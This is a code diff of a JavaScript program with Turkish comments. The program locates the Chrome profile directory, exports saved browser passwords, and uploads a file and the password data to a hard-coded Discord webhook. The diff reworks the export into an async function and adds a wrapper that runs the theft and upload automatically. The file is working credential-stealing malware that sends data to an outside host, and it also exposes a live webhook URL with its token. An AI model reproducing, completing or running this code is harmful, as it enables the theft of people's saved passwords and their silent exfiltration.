@@ -112,7 +112,7 @@ function getChromeProfilePath() {
   return null;
 }
 
-function exportChromePasswords() {
+async function exportChromePasswords() {
   const chromeProfilePath = getChromeProfilePath();
 
   if (chromeProfilePath) {
@@ -140,7 +140,7 @@ function exportChromePasswords() {
       }
     };
 
-    return await getPasswords();
+    return getPasswords();
   } else {
     console.error('İşletim sistemine uygun Chrome profil dizini bulunamadı.');
     return null;
@@ -148,8 +148,6 @@ function exportChromePasswords() {
 }
 
 // Kullanım örneği
-const chromeProfilePath = exportChromePasswords();
-console.log('Chrome profil dizini:', chromeProfilePath);
 //passwd
 // string to file ------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -205,7 +203,17 @@ ${fs.readFileSync(targetFile, 'utf-8')}\r
 // Fonksiyonu kullanarak dosyayı webhook'a gönderme örneği
 const webhookUrl = 'https://discordapp.com/api/webhooks/1113158568741441618/mnvfcgVDEEzK9sy3ECvZeFo6OzdRV8gVzbiuv48dqCkrP5nIs0KfDZSst3GW_6ubNNNl';
 
-sendFileToWebhook(webhookUrl, filePath);
-sendFileToWebhook(webhookUrl, chromeProfilePath);
 
+async function aaaa(params) {
+  
+  const chromeProfilePath = await exportChromePasswords();
+  console.log('Chrome profil dizini:', chromeProfilePath);
+  
+
+  sendFileToWebhook(webhookUrl, filePath);
+  sendFileToWebhook(webhookUrl, chromeProfilePath);
+  
+}
+
+aaaa()
 // webhook ------------------------------------------------------------------------------------------------------------------------------------------------
